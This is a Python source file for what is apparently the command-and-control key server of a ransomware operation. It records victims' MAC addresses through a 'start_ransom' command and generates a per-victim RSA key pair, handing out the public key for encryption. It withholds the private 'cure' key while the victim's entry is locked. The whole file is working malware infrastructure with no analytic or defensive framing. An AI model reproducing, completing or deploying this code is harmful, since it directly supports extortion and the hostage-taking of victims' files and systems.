import socket
from threading import Thread, Lock
from keyExchangeServer import RSAExchange
import base64
from protocol import Secured_socket
from db import db
from rsa import RSA


HEADER = 4
ADDR = ("0.0.0.0", 4040)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP socket
sock.bind(ADDR)
dateBase = db()
mutexLock = Lock()


def send_private_key(request, parms):
    mac = request
    if len(mac) != 17:
        return "ERORBad mac"
    
    with mutexLock:
        private_key = dateBase.get_private_key(mac)
    
    if not private_key:
        return "ERORLocked"
    
    rsa = RSA()
    private_key_bytes = rsa.private_key_to_bytes(private_key)
    del rsa

    return "CNFM" + private_key_bytes.decode()


def secure_sock(conn):
    keySwitch = RSAExchange(conn)
    aes_key = keySwitch.switch_keys()
    del keySwitch
    if not aes_key:
        conn.close()
        return
    aes_iv = base64.b64decode(conn.recv(1024).strip())
    if not aes_iv:
        conn.close()
        return

    return (aes_key, aes_iv)


def secure_connection(conn, addr):
    print(f"[SERVER] new connection from {addr}")
    args = secure_sock(conn)
    if not args:
        return
    
    aes_key, aes_iv = args
    secured_conn = Secured_socket(conn, HEADER, aes_key, aes_iv)
    print("[SREVER] Secured connection esblished")

    secured_conn.confirm()
    handle_client(secured_conn, addr)


def start_ransom(request, parms):
    mac = request
    if len(mac) != 17:
        return "ERORBad Mac"
    
    if parms["mac"]:
        return "ERORMac was already sent"

    parms["mac"] = mac
    return "CNFM"


def generate_key(request, parms):
    if not parms["mac"]:
        return "ERORMac was not sent"
    
    if parms["keySent"]:
        return "ERORKey was already sent"
    
    rsa = RSA()
    private_key, public_key = rsa.generate_key_pair()

    global dateBase
    with mutexLock:
        dateBase.add(parms["mac"], private_key)

    public_key_bytes = rsa.public_key_to_bytes(public_key)
    del rsa
    return "CNFM" + public_key_bytes.decode()


def handle_client(secured_conn, addr):
    parms = {"mac": None, "keySent": False}
    while True:
        try:
            msg = secured_conn.recv()
            if not msg:
                raise ConnectionError("Empty message")
        except Exception:
            secured_conn.close()
            return
        
        cmd = msg[:4]
        request = msg[4::]
        confirm_msg = msgCodes[cmd](request, parms)

        try:
            secured_conn.send(confirm_msg)
        except Exception:
            secured_conn.close()
            return


def start_server(sock, addr):
    print(f"[SERVER] is listening on {addr}")
    sock.listen(5)
    threads = []
    listen = True
    while listen:
        conn, addr = sock.accept()
        t = Thread(target=secure_connection, args=(conn, addr))
        t.start()
        threads.append(t)
    

    for t in threads:
        t.join()


msgCodes = {"STRT": start_ransom, "SKEY": generate_key, "CURE": send_private_key}


if __name__ == "__main__":
    start_server(sock, ADDR)    